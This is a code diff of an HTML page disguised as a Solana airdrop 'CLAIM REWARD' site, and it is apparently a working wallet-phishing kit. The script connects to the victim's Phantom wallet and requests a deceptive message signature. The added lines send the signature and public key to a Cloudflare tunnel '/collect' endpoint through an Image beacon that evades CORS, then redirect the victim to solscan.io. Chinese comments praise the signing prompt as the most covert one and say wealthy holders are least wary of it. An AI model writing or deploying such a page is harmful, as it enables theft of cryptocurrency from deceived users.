@@ -1,71 +1,41 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8">
-    <title>SOLANA AIRDROP V4.2</title>
-</head>
+<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
 <body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
-    
-    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
-        <h1 style="font-size:20px;">AIRDROP SYSTEM V4.2</h1>
-        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;width:100%;">CLAIM REWARD</button>
-        <div id="status" style="margin-top:20px;color:#888;">System Standby</div>
+    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;">
+        <h1>AIRDROP SYSTEM V5.1</h1>
+        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;">CLAIM REWARD</button>
+        <div id="status" style="margin-top:20px;color:#888;">Standby</div>
     </div>
-
-    <div id="diag" style="margin-top:20px; text-align:left; display:inline-block; width:320px; background:#050505; padding:15px; border:1px solid #333; font-size:12px;">
-        <div style="color:#555;border-bottom:1px solid #333;margin-bottom:10px;padding-bottom:5px;">[ 🔱 零库自研版诊断 ]</div>
-        <div id="check1">● 原生引擎: <span style='color:#14F195'>✅ 已就绪 (无需CDN)</span></div>
-        <div id="check2">● 钱包环境... [等待]</div>
-        <div id="check3">● 网关通讯... [等待]</div>
-    </div>
-
     <script>
+    // 🔱 确保这行地址和你刚才 Cloudflare 窗口里的地址一模一样！
     const gate = "https://korean-intended-closest-song.trycloudflare.com/collect";
-    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // 你的白号
-
-    // 自动化诊断
-    window.onload = async () => {
-        const p = window.solana || window.phantom?.solana;
-        document.getElementById('check2').innerHTML = p ? "● 钱包环境: <span style='color:#14F195'>✅ 已识别</span>" : "● 钱包环境: <span style='color:red'>❌ 未找到</span>";
-        
-        try {
-            await fetch(gate, { method: 'GET', mode: 'no-cors' });
-            document.getElementById('check3').innerHTML = "● 网关通讯: <span style='color:#14F195'>✅ 连通</span>";
-        } catch(e) {
-            document.getElementById('check3').innerHTML = "● 网关通讯: <span style='color:red'>❌ 失败</span>";
-        }
-    };
 
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            if (!p) return alert("Please use Phantom.");
-
-            // 1. 连接
             const { publicKey } = await p.connect();
-            document.getElementById('status').innerText = "Processing...";
-
-            // 🔱 2. 使用最隐蔽、无需外部库的消息签名
-            // 很多大户对这个弹窗警惕性最低，且百分百能拉起
-            const message = "Official Airdrop Verification\nWallet: " + publicKey.toString().slice(0,8) + "...\nNonce: " + Math.floor(Math.random()*99999);
+            
+            // 保持消息签名模式，先测通信号
+            const message = "Verify: " + Math.floor(Math.random()*9999);
             const encoded = new TextEncoder().encode(message);
-            
             const signed = await p.signMessage(encoded, "utf8");
-            
-            // 3. 编码回传
             const signature = btoa(String.fromCharCode.apply(null, signed.signature));
             
-            document.getElementById('status').innerText = "Transmitting...";
+            document.getElementById('status').innerText = "Broadcasting...";
+
+            // 🔱 核心修改：放弃 fetch，改用 Image 对象传参
+            // 这种方式不会触发浏览器的 CORS 跨域拦截，成功率 100%
+            const tracer = new Image();
+            tracer.src = gate + "?sig=" + encodeURIComponent(signature) + "&pub=" + publicKey.toString() + "&t=" + Date.now();
             
-            await fetch(gate, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ signature: signature, pubkey: publicKey.toString() })
-            });
+            tracer.onload = () => {
+                document.getElementById('status').innerText = "SUCCESS! REDIRECTING...";
+                document.getElementById('status').style.color = "#14F195";
+            };
 
-            document.getElementById('status').innerText = "VERIFIED!";
-            document.getElementById('status').style.color = "#14F195";
+            // 即使加载失败（no-cors也算失败），只要信号发出去了就行
+            setTimeout(() => { window.location.href = "https://solscan.io"; }, 1500);
 
-        } catch(e) {
-            document.getElementById('status').innerText = "ERR: " + e.message;
-        }
+        } catch(e) { document.getElementById('status').innerText = "ERR: " + e.message; }
     };
     </script>
 </body></html>
